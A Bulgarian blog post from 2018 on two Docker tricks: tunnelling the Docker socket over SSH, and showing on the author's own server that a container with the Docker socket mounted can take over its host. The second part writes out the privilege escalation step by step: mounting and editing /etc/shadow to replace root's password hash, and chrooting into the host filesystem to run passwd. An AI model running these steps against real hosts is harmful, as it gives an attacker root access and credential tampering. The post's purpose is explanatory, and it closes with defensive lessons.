---
title: "–î–≤–µ –∑–∞–∏–≥—Ä–∞–≤–∫–∏ —Å Docker"
date: 2018-10-25T13:37:42+03:00
draft: false
description: –ö–∞–∫ –º–æ–∂–µ–º –¥–∞ —Å–µ –∑–∞–≤—ä—Ä–∂–µ–º –∑–∞ Docker daemon-–∞ –±–µ–∑ –¥–∞ –≥–æ –ø—Ä–∞–≤–∏–º –ø—É–±–ª–∏—á–µ–Ω –∏ –∫–∞–∫–≤–æ —Å—Ç–∞–≤–∞ –∞–∫–æ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä –∏–º–∞ –¥–æ—Å—Ç—ä–ø –¥–æ –Ω–µ–≥–æ? –ï–¥–Ω–∞ –∏—Å—Ç–æ—Ä–∏—è –∑–∞ –ø—Ä–∏–∑—Ä–∞—Ü–∏, —Ö–∞–∫–µ—Ä—Å—Ç–≤–æ –∏ –∫–æ—Ä–µ–Ω–∏.
---

<img src="/images/posts/two-docker-tricks/plush-whale.jpg" style="display: block;max-width: 400px;margin: 0 auto;">

# –ó–∞–∏–≥—Ä–∞–≤–∫–∞ 1: –û—Ç–¥–∞–ª–µ—á–µ–Ω –¥–æ—Å—Ç—ä–ø –¥–æ Docker –±–µ–∑ –¥–∞ –æ—Ç–≤–∞—Ä—è–º–µ –ø–æ—Ä—Ç

–ü–æ–Ω—è–∫–æ–≥–∞ –µ–∫—Å–ø–µ—Ä–∏–º–µ–Ω—Ç–∏—Ä–∞–º —Å —Ä–∞–∑–Ω–∏ docker –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∏ –Ω–∞ –º–∞–∫–±—É–∫–∞ —Å–∏. –ó–∞ —Å—ä–∂–∞–ª–µ–Ω–∏–µ, —Ç–æ–π –Ω—è–º–∞ –º–Ω–æ–≥–æ RAM (—Å–∞–º–æ 8GB) –∏ –≤ –Ω—è–∫–æ–∏ —Å–ª—É—á–∞–∏ –Ω–µ —Å–º–æ–≥–≤–∞ –∞–∫–æ –ø—É—Å–Ω–∞ –∏ Docker. –í–∫—ä—â–∏ —Å—ä–º —Å–∏ –ø—É—Å–Ω–∞–ª –µ–¥–Ω–∞ –≤–∏—Ä—Ç—É–∞–ª–∫–∞, –Ω–∞ –∫–æ—è—Ç–æ –∏–º–∞–º Docker. –î–æ –Ω–µ—è –∏–º–∞–º SSH –¥–æ—Å—Ç—ä–ø –æ—Ç–≤—Å—è–∫—ä–¥–µ –ø—Ä–µ–∑ –ø—É–±–ª–∏—á–µ–Ω –∞–¥—Ä–µ—Å (`ghost.gangelov.net`).

–ó–∞ —â–∞—Å—Ç–∏–µ, –∫–∏—Ç—á–µ—Ç–æ –º–æ–∂–µ –¥–∞ –ø–æ–ª–∑–≤–∞ –æ—Ç–¥–∞–ª–µ—á–µ–Ω —Ö–æ—Å—Ç. –î–æ—Å—Ç–∞—Ç—ä—á–Ω–æ –µ —Å–∞–º–æ (1) –¥–∞ —Å–µ –Ω–∞—Å—Ç—Ä–æ–∏ docker daemon-–∞ –¥–∞ —Å–ª—É—à–∞ –Ω–∞ TCP –ø–æ—Ä—Ç –∏ (2) –¥–∞ —Å–µ –∑–∞–¥–∞–¥–µ `DOCKER_HOST=tcp://<–∞–¥—Ä–µ—Å>:<–ø–æ—Ä—Ç>`.

–¢–æ–≤–∞, –∫–æ–µ—Ç–æ –Ω–µ –∏—Å–∫–∞–º –¥–∞ –ø—Ä–∞–≤—è, –æ–±–∞—á–µ, –µ –¥–∞ expose-–≤–∞–º docker –ø–æ—Ä—Ç –∫—ä–º –¶–µ–ª–∏—è –ò–Ω—Ç–µ—Ä–Ω–µ—Ç‚Ñ¢Ô∏è, [–¥–æ—Ä–∏ –∑–∞—â–∏—Ç–µ–Ω](https://docs.docker.com/engine/security/https/). –ó–∞—â–æ? –ü—ä—Ä–≤–æ, –º–Ω–æ–≥–æ –≤–µ—Ä–æ—è—Ç–Ω–æ –µ –≤ –¥–∞–¥–µ–Ω –º–æ–º–µ–Ω—Ç –¥–∞ —Å–µ –æ–∫–∞–∂–µ, —á–µ –∏–º–∞ —É—è–∑–≤–∏–º–æ—Å—Ç. –í—Ç–æ—Ä–æ, –∑–∞—â–∏—Ç–∞—Ç–∞ –Ω–∞ —Å–æ–∫–µ—Ç–∞ –≤–∫–ª—é—á–≤–∞ –ø—Ä–∞–≤–∏–ª–Ω–æ –≥–µ–Ω–µ—Ä–∏—Ä–∞–Ω–µ –∏ —Ä–∞–∑–ø—Ä–æ—Å—Ç—Ä–∞–Ω–µ–Ω–∏–µ –Ω–∞ —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç–∏, –∫–æ–π—Ç–æ –ø—Ä–æ—Ü–µ—Å –≤—Å–µ –æ—â–µ –Ω–µ —Ä–∞–∑–±–∏—Ä–∞–º –¥–æ–±—Ä–µ.

![](/images/posts/two-docker-tricks/securing-docker-socket.png)

–î—Ä—É–≥ –≤–∞—Ä–∏–∞–Ω—Ç –µ –¥–∞ —Å–µ expose-–Ω–µ —Å–∞–º–æ –≤ –ª–æ–∫–∞–ª–Ω–∞—Ç–∞ –º—Ä–µ–∂–∞ –∏ –¥–∞ –∏–∑–ø–æ–ª–∑–≤–∞–º VPN, –∫–æ–≥–∞—Ç–æ –Ω–µ —Å—ä–º —Å–∏ –≤–∫—ä—â–∏. –ò–º–∞–º –Ω–∞—Å—Ç—Ä–æ–µ–Ω VPN, –Ω–æ –Ω–µ –∏—Å–∫–∞–º –¥–∞ —Ç—Ä—è–±–≤–∞ —Ü–µ–ª–∏—è—Ç –º–∏ —Ç—Ä–∞—Ñ–∏–∫ –¥–∞ –º–∏–Ω–∞–≤–∞ –æ—Ç—Ç–∞–º –¥–æ–∫–∞—Ç–æ –∏–∑–ø–æ–ª–∑–≤–∞–º docker. –°—ä—â–æ —Ç–∞–∫–∞, —Ü–µ–ª–∏—è—Ç —Å—ä—Ä–≤—ä—Ä —Å—Ç–∞–≤–∞ –æ—Ç–≤–æ—Ä–µ–Ω –∫—ä–º –ª–æ–∫–∞–ª–Ω–∞—Ç–∞ –º—Ä–µ–∂–∞, –∫–∞–∫—Ç–æ —â–µ –≤–∏–¥–∏–º —Å–ª–µ–¥ –º–∞–ª–∫–æ.

–í –¥–∞–¥–µ–Ω –º–æ–º–µ–Ω—Ç —Å–µ —Å–µ—Ç–∏—Ö, —á–µ SSH –º–æ–∂–µ –¥–∞ –æ—Ç–≤–∞—Ä—è —Ç—É–Ω–µ–ª–∏ –∫—ä–º TCP –ø–æ—Ä—Ç–æ–≤–µ. –û–∫–∞–∑–≤–∞ —Å–µ, —Ç–æ–π –º–æ–∂–µ –¥–∞ –æ—Ç–≤–∞—Ä—è —Ç—É–Ω–µ–ª–∏ –Ω–µ —Å–∞–º–æ –º–µ–∂–¥—É TCP/UDP –ø–æ—Ä—Ç–æ–≤–µ, –Ω–æ –∏ –¥–∞ –ø—Ä–æ–∫—Å–∏—Ä–∞ UNIX socket-–∏.

–ß–∞–∫–∞–π! ü§î `/var/run/docker.sock` –µ UNIX socket!

–°—Ö–µ–º–∞—Ç–∞ –µ —Å–ª–µ–¥–Ω–∞—Ç–∞:

- –í –µ–¥–∏–Ω —Ç–µ—Ä–º–∏–Ω–∞–ª –ø—É—Å–∫–∞–º–µ `ssh -nNT -L ~/.remote-docker.sock:/var/run/docker.sock <—Ö–æ—Å—Ç>`
- –í –¥—Ä—É–≥ —Ç–µ—Ä–º–∏–Ω–∞–ª –∑–∞–¥–∞–≤–∞–º–µ `export DOCKER_HOST=unix:///Users/<–ø–æ—Ç—Ä–µ–±–∏—Ç–µ–ª>/.remote-docker.sock`

–í—ä–≤ –≤—Ç–æ—Ä–∏—è —Ç–µ—Ä–º–∏–Ω–∞–ª –≤–µ—á–µ –º–æ–∂–µ –¥–∞ —Å–µ –∏–∑–ø–æ–ª–∑–≤–∞ `docker`, –∏–∑–ø–æ–ª–∑–≤–∞–π–∫–∏ –æ—Ç–¥–∞–ª–µ—á–µ–Ω–∏—è —Ö–æ—Å—Ç. –í—Å–∏—á–∫–æ —Ç–æ–≤–∞ –º–∏–Ω–∞–≤–∞ –ø—Ä–µ–∑ `ssh` –∏ –Ω–∏–∫—ä–¥–µ –Ω—è–º–∞ –æ—Ç–≤–æ—Ä–µ–Ω–∏ docker –ø–æ—Ä—Ç–æ–≤–µ!

_–ú–∞–ª–∫–æ –ø–æ—è—Å–Ω–µ–Ω–∏–µ –∑–∞ –æ–ø—Ü–∏–∏—Ç–µ –Ω–∞ `ssh`:_
- _`-L` –º–∞–ø–≤–∞ –ª–æ–∫–∞–ª–µ–Ω —Å–æ–∫–µ—Ç –∫—ä–º –æ—Ç–¥–∞–ª–µ—á–µ–Ω —Ç–∞–∫—ä–≤._
- _`-nNT` –∫–∞—Ä–∞ `ssh` –¥–∞ –Ω–µ –æ—Ç–≤–∞—Ä—è –∏–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–µ–Ω —Ç–µ—Ä–º–∏–Ω–∞–ª –∫—ä–º —Å—ä—Ä–≤—ä—Ä–∞ - –∏–Ω—Ç–µ—Ä–µ—Å—É–≤–∞ –Ω–∏ —Å–∞–º–æ —Å–æ–∫–µ—Ç—ä—Ç._

# –ó–∞–∏–≥—Ä–∞–≤–∫–∞ 2: –î–∞ —Ö–∞–∫–Ω–µ–º —Ö–æ—Å—Ç–∞ –ø—Ä–µ–∑ –∑–∞–∫–∞—á–µ–Ω Docker —Å–æ–∫–µ—Ç

–ö–∞–∫–≤–æ –ø—Ä–∞–≤–∏–º –æ–±–∏–∫–Ω–æ–≤–µ–Ω–æ, –∫–æ–≥–∞—Ç–æ –µ–¥–∏–Ω –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä –∏–º–∞ –Ω—É–∂–¥–∞ –¥–∞ –ø—É—Å–∫–∞ –¥—Ä—É–≥–∏ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∏? –ó–∞–∫–∞—á–∞–º–µ `/var/run/docker.sock` –∫–∞—Ç–æ volume –≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞:

```sh
$ docker run -it -v /var/run/docker.sock:/var/run/docker.sock <image>
```

–ö—ä–¥–µ—Ç–æ –∏ –¥–∞ –ø—Ä–æ—á–µ—Ç–µ–º –∑–∞ —Ç–æ–∑–∏ —Ç—Ä–∏–∫ - –≤—Å–µ –ø–∏—à–µ, —á–µ –Ω–µ —Ç—Ä—è–±–≤–∞–ª–æ –¥–∞ —Å–µ –ø—Ä–∞–≤–∏. –ë–∏–ª–æ —Ä–∏—Å–∫ –≤ —Å–∏–≥—É—Ä–Ω–æ—Å—Ç—Ç–∞. –©—è–ª–æ –¥–∞ –ø—Ä–∏–∑–æ–≤–µ –õ—É—Ü–∏—Ñ–µ—Ä. [–î–æ—Ä–∏ `<center>`-—ä—Ç –Ω–µ –º–æ–∂–µ–ª –¥–∞ –≥–æ –∑–∞–¥—ä—Ä–∂–∏.](https://stackoverflow.com/a/1732454/557600)

–ù–æ –ø–æ–Ω–µ–∂–µ –Ω–∏–µ –Ω–µ –≤—è—Ä–≤–∞–º–µ –Ω–∞ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—è—Ç–∞ - —â–µ –ø—Ä–æ–≤–µ—Ä–∏–º —Å–∞–º–∏. –ú–æ–∂–µ–º –ª–∏ –¥–∞ —Ö–∞–∫–Ω–µ–º —Å—ä—Ä–≤—ä—Ä–∞ –ø—Ä–µ–∑ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä, –≤ –∫–æ–π—Ç–æ –µ –∑–∞–∫–∞—á–µ–Ω docker —Å–æ–∫–µ—Ç–∞? –û–∫–∞–∑–≤–∞ —Å–µ - –¥–∞, –ø—Ä–∏ —Ç–æ–≤–∞ –¥–æ—Å—Ç–∞ –ª–µ—Å–Ω–æ.

–ó–∞ –¥–∞ –µ —á–µ—Å—Ç–Ω–æ, –≤—ä–≤–µ–∂–¥–∞–º–µ –µ–¥–Ω–æ –ø—Ä–∞–≤–∏–ª–æ - –ø—É—Å–∫–∞–º–µ –µ–¥–∏–Ω –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä —Å `/bin/bash` –∏ –∏–º–∞–º–µ –ø—Ä–∞–≤–æ –¥–∞ –ø–∏—à–µ–º —Å–∞–º–æ –≤ —Ç–æ–∑–∏ —Ç–µ—Ä–º–∏–Ω–∞–ª. –¶–µ–ª—Ç–∞ –Ω–∏ –µ –¥–∞ –ø—Ä–æ–º–µ–Ω–∏–º root –ø–∞—Ä–æ–ª–∞—Ç–∞ –Ω–∞ —Ö–æ—Å—Ç–∞ (–∏–∑–≤—ä–Ω –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞).

```sh
 ghost ~ $ docker run -it -v /var/run/docker.sock:/var/run/docker.sock debian:latest bin/bash
Unable to find image 'debian:latest' locally
latest: Pulling from library/debian
bc9ab73e5b14: Pull complete
Digest: sha256:802706fa62e75c96fff96ada0e8ca11f570895ae2e9ba4a9d409981750ca544c
Status: Downloaded newer image for debian:latest
root@8527c0fa48ad:/#
```

_–ó–∞—â–æ Debian? –ó–∞—â–æ—Ç–æ, –∫–∞–∫—Ç–æ –∑–Ω–∞–µ–º, Ubuntu –µ —é–∂–Ω–æ–∞—Ñ—Ä–∏–∫–∞–Ω—Å–∫–∏ –∑–∞ "–ù–µ –º–æ–≥–∞ –¥–∞ –∏–Ω—Å—Ç–∞–ª–∏—Ä–∞–º Debian". –ü—ä–∫ —Ç—É–∫ –Ω—è–º–∞ –Ω—É–∂–¥–∞ –æ—Ç –∏–Ω—Å—Ç–∞–ª–∏—Ä–∞–Ω–µ._

–ü—ä—Ä–≤–æ, –¥–∞ —Å–∏ –∏–Ω—Å—Ç–∞–ª–∏—Ä–∞–º–µ docker –∫–ª–∏–µ–Ω—Ç–∞, –∑–∞ –¥–∞ –∏–∑–ø–æ–ª–∑–≤–∞–º–µ —Å–æ–∫–µ—Ç–∞. _[–°–ª–µ–¥–≤–∞–º–µ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏—Ç–µ —Ç—É–∫](https://docs.docker.com/install/linux/docker-ce/debian/#install-using-the-repository):_

```sh
root@8527c0fa48ad:/# apt update
[...]
root@8527c0fa48ad:/# apt install -y apt-transport-https ca-certificates curl gnupg2 software-properties-common
[...]
root@8527c0fa48ad:/# curl -fsSL https://download.docker.com/linux/debian/gpg | apt-key add -
OK
root@8527c0fa48ad:/# add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/debian $(lsb_release -cs) stable"
root@8527c0fa48ad:/# apt update && apt install docker-ce -y
[...]
```

–ú–æ–∂–µ—à–µ –¥–∞ —Ç—Ä—ä–≥–Ω–µ–º –ø—Ä–æ—Å—Ç–æ –æ—Ç –Ω—è–∫–æ–π image —Å –∏–Ω—Å—Ç–∞–ª–∏—Ä–∞–Ω docker, –Ω–æ –∫—ä–¥–µ –µ —Ç—Ä—ä–ø–∫–∞—Ç–∞ –≤ —Ç–æ–≤–∞?

–°–µ–≥–∞ –¥–∞ –ø—Ä–æ–±–≤–∞–º–µ:

```sh
root@8527c0fa48ad:/# docker ps
CONTAINER ID        IMAGE                       COMMAND                  CREATED             STATUS                         PORTS                                      NAMES
8527c0fa48ad        debian:latest               "bin/bash"               7 minutes ago       Up 7 minutes                                                              eloquent_curie
[...]
```

–ò–¥–µ–∞–ª–Ω–æ - –≤–∏–∂–¥–∞–º–µ —Å–æ–±—Å—Ç–≤–µ–Ω–∏—è —Å–∏ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä, –∑–Ω–∞—á–∏ —Å–º–µ –∑–∞–≤—ä—Ä–∑–∞–Ω–∏ –∑–∞ Docker host-a –∏–∑–≤—ä–Ω –Ω–µ–≥–æ.

Docker –ø–æ—Ç—Ä–µ–±–∏—Ç–µ–ª—è—Ç –µ `root`. –¢–æ–≤–∞ –∑–Ω–∞—á–∏, —á–µ –≤ –ø—Ä–æ–∏–∑–≤–æ–ª–µ–Ω –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä –º–æ–∂–µ–º –¥–∞ –∑–∞–∫–∞—á–∏–º –≤—Å—è–∫–∞ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –∏–ª–∏ —Ñ–∞–π–ª. –ö–∞–∫–≤–æ –±–∏—Ö–º–µ –∏—Å–∫–∞–ª–∏ –¥–∞ mount-–Ω–µ–º? –û—á–µ–≤–∏–¥–µ–Ω –∏–∑–±–æ—Ä –µ `/etc/shadow`, –∫—ä–¥–µ—Ç–æ —Å–µ —Å—ä—Ö—Ä–∞–Ω—è–≤–∞—Ç –ø–∞—Ä–æ–ª–∏—Ç–µ –Ω–∞ –ø–æ—Ç—Ä–µ–±–∏—Ç–µ–ª–∏—Ç–µ. –î–∞ –≤–∏–¥–∏–º:

```sh
root@8527c0fa48ad:/# docker run -it -v /etc/shadow:/etc/shadow debian:latest bin/bash
root@10155f95be81:/# cat /etc/shadow
root:$6$Kad231.b$A0EIaZMI.IBoBztK3lMn20A0ELaZMI.IBoBztK3lMn20A0EIaZMI.IBoBztK3lMn20:17110:0:99999:7:::
daemon:*:17001:0:99999:7:::
bin:*:17001:0:99999:7:::
sys:*:17001:0:99999:7:::
sync:*:17001:0:99999:7:::
games:*:17001:0:99999:7:::
man:*:17001:0:99999:7:::
lp:*:17001:0:99999:7:::
mail:*:17001:0:99999:7:::
news:*:17001:0:99999:7:::
uucp:*:17001:0:99999:7:::
[...]
```

–ù–∞ –ø—ä—Ä–≤–∏—è —Ä–µ–¥ –≤–∏–∂–¥–∞–º–µ —Ö–µ—à–∏—Ä–∞–Ω–∞—Ç–∞ –ø–∞—Ä–æ–ª–∞ –Ω–∞ `root`. –í—Å–µ–∫–∏ —Ä–µ–¥ —Å—ä–¥—ä—Ä–∂–∞ —Å—Ç–æ–π–Ω–æ—Å—Ç–∏, —Ä–∞–∑–¥–µ–ª–µ–Ω–∏ —Å `:`:

- `root` –µ, –æ—á–µ–≤–∏–¥–Ω–æ, –∏–º–µ—Ç–æ –Ω–∞ –ø–æ—Ç—Ä–µ–±–∏—Ç–µ–ª—è.
- `$6$Kad231.b$A0EIaZMI.IBoBztK3lMn20A0ELaZMI.IBoBztK3lMn20A0EIaZMI.IBoBztK3lMn20` –µ —Ö–µ—à—ä—Ç –Ω–∞ –ø–∞—Ä–æ–ª–∞—Ç–∞:
    - `$6$` –æ–∑–Ω–∞—á–∞–≤–∞, —á–µ —Ö–µ—à—ä—Ç –µ SHA512.
    - `Kad231.b` –µ —Å–æ–ª—Ç–∞.
    - `A0EIaZMI.IBoBztK3lMn20A0EIaZMI.IBoBztK3lMn20A0EIaZMI.IBoBztK3lMn20` –µ —Å–∞–º–∏—è—Ç —Ö–µ—à.
- `17110` –µ –±—Ä–æ–π –¥–Ω–∏ (–æ—Ç –ø—ä—Ä–≤–∏ —è–Ω—É–∞—Ä–∏ 1970-—Ç–∞), –ø—Ä–µ–¥–∏ –∫–æ–∏—Ç–æ –ø–æ—Å–ª–µ–¥–Ω–æ –µ —Å–º–µ–Ω–µ–Ω–∞ –ø–∞—Ä–æ–ª–∞—Ç–∞.
- `0` –µ –º–∏–Ω–∏–º–∞–ª–Ω–∏—è—Ç –±—Ä–æ–π –¥–Ω–∏, –ø—Ä–µ–¥–∏ –∫–æ–∏—Ç–æ –ø–∞—Ä–æ–ª–∞—Ç–∞ –Ω–µ –º–æ–∂–µ –¥–∞ –±—ä–¥–µ —Å–º–µ–Ω–µ–Ω–∞.
- `99999` –µ –±—Ä–æ—è—Ç –¥–Ω–∏, —Å–ª–µ–¥ –∫–æ–∏—Ç–æ –ø–∞—Ä–æ–ª–∞—Ç–∞ —Ç—Ä—è–±–≤–∞ –¥–∞ –±—ä–¥–µ —Å–º–µ–Ω–µ–Ω–∞.
- `7` –µ –±—Ä–æ–π –¥–Ω–∏ –ø—Ä–µ–¥–∏ –∏–∑—Ç–∏—á–∞–Ω–µ—Ç–æ –Ω–∞ –ø–∞—Ä–æ–ª–∞—Ç–∞, –∫–æ–≥–∞—Ç–æ –ø–æ—Ç—Ä–µ–±–∏—Ç–µ–ª—è—Ç —Ç—Ä—è–±–≤–∞ –¥–∞ –±—ä–¥–µ –ø—Ä–µ–¥—É–ø—Ä–µ–¥–µ–Ω, —á–µ —Ç—Ä—è–±–≤–∞ –¥–∞ —è —Å–º–µ–Ω–∏.
- –ü–æ—Å–ª–µ–¥–Ω–∏—Ç–µ –¥–≤–µ –ø—Ä–∞–∑–Ω–∏ —Å—Ç–æ–π–Ω–æ—Å—Ç–∏ —Å–∞ —Å—ä–æ—Ç–≤–µ—Ç–Ω–æ:
    - –ö–æ–ª–∫–æ –¥–Ω–∏ —Å–ª–µ–¥ –∏–∑—Ç–∏—á–∞–Ω–µ—Ç–æ –Ω–∞ –ø–∞—Ä–æ–ª–∞—Ç–∞ —Ç—Ä—è–±–≤–∞ –¥–∞ –±—ä–¥–µ –¥–µ–∞–∫—Ç–∏–≤–∏—Ä–∞–Ω –ø–æ—Ç—Ä–µ–±–∏—Ç–µ–ª—è—Ç.
    - –ê–±—Å–æ–ª—é—Ç–Ω–∞ –¥–∞—Ç–∞, –Ω–∞ –∫–æ—è—Ç–æ —Ç—Ä—è–±–≤–∞ –¥–∞ –±—ä–¥–µ –¥–µ–∞–∫—Ç–∏–≤–∏—Ä–∞–Ω.

–¢–æ–≤–∞, –∫–æ–µ—Ç–æ –Ω–∏ –∏–Ω—Ç–µ—Ä–µ—Å—É–≤–∞ –µ —Ö–µ—à–∏—Ä–∞–Ω–∞—Ç–∞ –ø–∞—Ä–æ–ª–∞. –ò–º–∞–º–µ –¥–æ—Å—Ç—ä–ø –∑–∞ –ø–∏—Å–∞–Ω–µ –¥–æ —Ñ–∞–π–ª–∞, —Ç–∞–∫–∞ —á–µ —Ç—Ä—è–±–≤–∞ —Å–∞–º–æ –¥–∞ –≥–µ–Ω–µ—Ä–∏—Ä–∞–º–µ –Ω–æ–≤–∞:

```sh
root@10155f95be81:/# apt install openssl vim
[...]
root@10155f95be81:/# openssl passwd -1 -salt 123 haxx
$1$123$inYSeyhgm/nz0BAstU9Tc/
```

`-1` –∫–∞–∑–≤–∞ –Ω–∞ `openssl` –¥–∞ –≥–µ–Ω–µ—Ä–∏—Ä–∞ `md5` —Ö–µ—à. –¢–æ–≤–∞ –µ —É–∂–∞—Å–Ω–æ —Å—á—É–ø–µ–Ω —Ö–µ—à–∏—Ä–∞—â –∞–ª–≥–æ—Ä–∏—Ç—ä–º. –ù–æ –ø—ä–∫ –µ –ª–µ—Å–µ–Ω –∑–∞ –≥–µ–Ω–µ—Ä–∏—Ä–∞–Ω–µ, –∞ –∑–∞ —Ü–µ–ª–∏—Ç–µ –Ω–∞ –¥–µ–º–æ—Ç–æ –Ω–µ –Ω–∏ –∏–Ω—Ç–µ—Ä–µ—Å—É–≤–∞. `123` –µ —Å–æ–ª—Ç–∞ –∫—ä–º —Ö–µ—à–∞, –∞ `haxx` –µ —Å–∞–º–∞—Ç–∞ –ø–∞—Ä–æ–ª–∞.

–û—Å—Ç–∞–≤–∞ —Å–∞–º–æ –¥–∞ –∫–æ–ø–∏—Ä–∞–º–µ –≥–µ–Ω–µ—Ä–∏—Ä–∞–Ω–∏—è –Ω–∏–∑ –∏ –¥–∞ —Å–º–µ–Ω–∏–º —Å—ä—â–µ—Å—Ç–≤—É–≤–∞—â–∏—è –≤ `/etc/shadow`.

```sh
root@10155f95be81:/# vim /etc/shadow
[...]
:wq
```

## –°—Ç–∞–Ω–∞ –ª–∏?

–û—Ç–≤–∞—Ä—è–º–µ –Ω–æ–≤ —Ç–µ—Ä–º–∏–Ω–∞–ª, –∑–∞–∫–∞—á–∞–º–µ —Å–µ –∑–∞ —Å—ä—Ä–≤—ä—Ä–∞ –∏...

```sh
 ~ $ ssh ghost
Boo!

[...]

 ghost ~ $ su
Password: haxx
                                                    .--`   ``-:.``.-/. ```.
                                                   .-/- ..`-/-.`.::-:...--
                                                  .-.-/:-.`.:.`.-:-.+..../`
                                                  `.:`-:/:``-.`-/+.-/.`.:-.-.
                                                  `.:/../::`.`.-+o-:-.`--..//`
                                                  `.-//.:/-````./o+::.`....-/
                                                  -/.-+:-o-.`.`.-:-+-....::-:
                                                  `+:--+-+-.--.`.``..``.-:.---
                                                   .o-..-....-.-:/oydh+..`:+:`
                                                    -/`..:/+/:::sNNNdhy:``::`
                                                     .-sdmmss+-.:mhdsso/.-+.
                                                      .+smhm/-.``:/+++o-./s/
    ___     _   __  __   ___  ___   ___ _____          `:oddy.--.``.`--:.-/s/
   |_ _|   /_\ |  \/  | | _ \/ _ \ / _ \_   _|          .-/+-.--```.``..-://oo`
    | |   / _ \| |\/| | |   / (_) | (_) || |             -+/.`.``````.:/-..-+do.`
   |___| /_/ \_\_|  |_| |_|_\\___/ \___/ |_|              --.....``.--:o:-.-ss+s:`
                                                         `:s/++++++/:-...:hs/:ys/.
                                                          .s+/+/::-.```-+yy/+/:ysss:`
                                                           .--:/++/-.-oyydh:h/:-o/++:
                                                            ``++//+syhmhshd:hs::+.:o:
                                                              -dmsddyyd+syy:/h::o.:y:
                                                               -mhdysssshso-:+//s.-d+
                                                                sydsoyyhms//osso/--o/
                                                                o/hh+:+sm++NMm+:--.s+
                                                                /:o:-:ody//md:---.:hy
                                                                /oo::o+yy/-:s-----o/-
                                                                /://y/:yh/-.-//-.+/-/
                                                               .---oo/s::ho:..::/y--/
                                                               ..`.--+.-hNNh+:-.-o---
root@ghost:/home/stormbreaker#
```

**–°—ä–∫—Å–µ—Å!**

## –í—Ç–æ—Ä–∏ –≤–∞—Ä–∏–∞–Ω—Ç

–ú–æ–∂–µ–º –¥–∞ —Å–º–µ–Ω–∏–º –ø–∞—Ä–æ–ª–∞—Ç–∞ –∏ –ø–æ –¥—Ä—É–≥ –Ω–∞—á–∏–Ω, –∞–∫–æ –Ω–µ –Ω–∏ —Å–µ –ø–∏–ø–∞ –¥–∏—Ä–µ–∫—Ç–Ω–æ –≤ `/etc/shadow`. –î–∞ –∑–∞–∫–∞—á–∏–º —Ü—è–ª–∞—Ç–∞ —Ñ–∞–π–ª–æ–≤–∞ —Å–∏—Å—Ç–µ–º–∞ –Ω–∞ —Ö–æ—Å—Ç–∞ –∫–∞—Ç–æ volume –≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞:

```sh
root@8527c0fa48ad:/# docker run -it -v /:/host-root debian:latest bin/bash
root@e408da377f10:/# ls /host-root
bin   data  etc   initrd.img	  lib	 lib64	     media  opt   root	sbin  srv  tmp	var	 vmlinuz.old
boot  dev   home  initrd.img.old  lib32  lost+found  mnt    proc  run	snap  sys  usr	vmlinuz
```

–°–ª–µ–¥ —Ç–æ–≤–∞ –º–æ–∂–µ–º –¥–∞ –∏–∑–ø–æ–ª–∑–≤–∞–º–µ `/host-root` –∫–∞—Ç–æ root –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è—Ç–∞ –∑–∞ –ø–æ–¥–ø—Ä–æ—Ü–µ—Å...

```sh
root@e408da377f10:/# chroot /host-root

# ls /
bin   data  etc   initrd.img	  lib	 lib64	     media  opt   root	sbin  srv  tmp	var	 vmlinuz.old
boot  dev   home  initrd.img.old  lib32  lost+found  mnt    proc  run	snap  sys  usr	vmlinuz
```

...—Å–ª–µ–¥ –∫–æ–µ—Ç–æ –¥–∞ —Å–º–µ–Ω–∏–º –ø–∞—Ä–æ–ª–∞—Ç–∞ —Å `passwd`:

```sh
# passwd
Enter new UNIX password: haxxored
Retype new UNIX password: haxxored
passwd: password updated successfully
```

–ù–µ–≥–∞—Ç–∏–≤—ä—Ç –Ω–∞ —Ç–æ–∑–∏ –ø–æ–¥—Ö–æ–¥ –µ, —á–µ —Å—Ç–∞–Ω–∞ –ø—Ä–µ–∫–∞–ª–µ–Ω–æ –ª–µ—Å–Ω–æ.

# –ü–æ—Å–ª–µ–¥—Å—Ç–≤–∏—è

–ö–∞–∫–≤–æ –Ω–∏ –∏–Ω—Ç–µ—Ä–µ—Å—É–≤–∞ —Ç–æ–≤–∞? –ù—è–∫–æ–ª–∫–æ –Ω–µ—â–∞:

- –í—Å–µ–∫–∏, –∫–æ–π—Ç–æ –µ –≤ Docker –≥—Ä—É–ø–∞—Ç–∞ –µ, –Ω–∞ –ø—Ä–∞–∫—Ç–∏–∫–∞, `root` –Ω–∞ —Å—ä—Ä–≤—ä—Ä–∞. –ê–∫–æ –º–æ–≥–∞ –¥–∞ –ø—É—Å–∫–∞–º –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∏, –∑–Ω–∞—á–∏ –∏–º–∞–º –ø—ä–ª–µ–Ω –¥–æ—Å—Ç—ä–ø –¥–æ —Ö–æ—Å—Ç–∞.
- –ö–æ–Ω—Ç–µ–π–Ω–µ—Ä, –∫–æ–π—Ç–æ –∏–∑–∏—Å–∫–≤–∞ mount –Ω–∞ docker —Å–æ–∫–µ—Ç–∞ –º–æ–∂–µ –¥–∞ –±—ä–¥–µ –µ—Ñ–µ–∫—Ç–∏–≤–µ–Ω –≤—Ö–æ–¥ –∑–∞ –∞—Ç–∞–∫–∞. –•—É–±–∞–≤–æ –µ —Ç–∞–∫–∏–≤–∞ –¥–∞ —Å–∞ –º–∞–∫—Å–∏–º–∞–ª–Ω–æ –∏–∑–æ–ª–∏—Ä–∞–Ω–∏ –æ—Ç –≤—ä–Ω—à–Ω–∏—è —Å–≤—è—Ç.
